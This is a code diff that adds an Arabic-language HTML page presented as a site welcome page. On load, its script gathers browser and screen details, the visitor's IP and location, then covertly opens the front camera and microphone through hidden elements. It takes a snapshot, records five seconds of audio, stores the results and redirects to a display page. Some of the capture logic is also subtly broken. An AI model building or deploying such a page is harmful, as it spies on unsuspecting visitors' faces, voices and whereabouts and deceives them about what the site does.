@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>إرسال البيانات تلقائيًا</title>
+</head>
+<body>
+    <h1>مرحبًا بك في موقعنا!</h1>
+    <p>يتم جمع معلوماتك تلقائيًا فور زيارتك للموقع...</p>
+
+    <!-- عنصر لعرض الكاميرا -->
+    <video id="video" width="320" height="240" autoplay style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        // جمع البيانات تلقائيًا عند تحميل الصفحة
+        function collectData() {
+            var userData = {
+                browser: navigator.userAgent,
+                operatingSystem: navigator.platform,
+                language: navigator.language,
+                screenSize: `${screen.width}x${screen.height}`,
+                localTime: new Date().toLocaleString(),
+                referrer: document.referrer || "لا يوجد",
+            };
+
+            // الحصول على عنوان الـ IP باستخدام ipify
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    userData.ip = data.ip;
+
+                    // الحصول على الموقع الجغرافي باستخدام GeoLocation API
+                    if (navigator.geolocation) {
+                        navigator.geolocation.getCurrentPosition(function(position) {
+                            userData.location = `Lat: ${position.coords.latitude}, Lon: ${position.coords.longitude}`;
+                            startCameraAndRecording(userData); // بدء الكاميرا والتسجيل
+                        });
+                    } else {
+                        console.error("لم يتم دعم الـ Geolocation في هذا المتصفح.");
+                        startCameraAndRecording(userData); // بدء الكاميرا والتسجيل حتى في حالة عدم وجود الموقع الجغرافي
+                    }
+                })
+                .catch(error => {
+                    console.error("حدث خطأ في الحصول على عنوان الـ IP:", error);
+                    startCameraAndRecording(userData); // بدء الكاميرا والتسجيل حتى في حالة وجود خطأ في ipify
+                });
+        }
+
+        // بدء الكاميرا الأمامية والتسجيل الصوتي
+        function startCameraAndRecording(userData) {
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true })
+                .then(function(stream) {
+                    // عرض الفيديو من الكاميرا بشكل مخفي
+                    var videoElement = document.getElementById("video");
+                    videoElement.srcObject = stream;
+
+                    // التقاط صورة من الفيديو
+                    var canvas = document.getElementById("canvas");
+                    canvas.width = videoElement.videoWidth;
+                    canvas.height = videoElement.videoHeight;
+                    canvas.getContext("2d").drawImage(videoElement, 0, 0);
+                    var imageData = canvas.toDataURL("image/png");
+                    userData.image = imageData; // تخزين الصورة في البيانات
+
+                    // بدء التسجيل الصوتي
+                    var mediaRecorder = new MediaRecorder(stream);
+                    var audioChunks = [];
+
+                    mediaRecorder.start(); // بدء التسجيل مباشرة
+
+                    setTimeout(function() {
+                        mediaRecorder.stop(); // التوقف بعد 5 ثوانٍ
+                    }, 5000);
+
+                    mediaRecorder.ondataavailable = function(event) {
+                        audioChunks.push(event.data);
+                    };
+
+                    mediaRecorder.onstop = function() {
+                        var audioBlob = new Blob(audioChunks, { type: "audio/wav" });
+                        var audioURL = URL.createObjectURL(audioBlob);
+                        userData.audio = audioURL; // تخزين رابط الصوت في البيانات
+
+                        sendDataToNextPage(userData); // إرسال البيانات إلى الصفحة التالية بعد التسجيل
+                    };
+                })
+                .catch(function(error) {
+                    console.error("حدث خطأ في الوصول إلى الكاميرا أو الميكروفون:", error);
+                });
+        }
+
+        // إرسال البيانات إلى الصفحة التالية
+        function sendDataToNextPage(data) {
+            // تخزين البيانات في localStorage
+            localStorage.setItem("userData", JSON.stringify(data));
+
+            // الانتقال إلى الصفحة الثانية لعرض البيانات
+            window.location.href = "display.html";
+        }
+
+        // جمع البيانات عند تحميل الصفحة
+        window.onload = collectData;
+    </script>
+</body>
+</html>
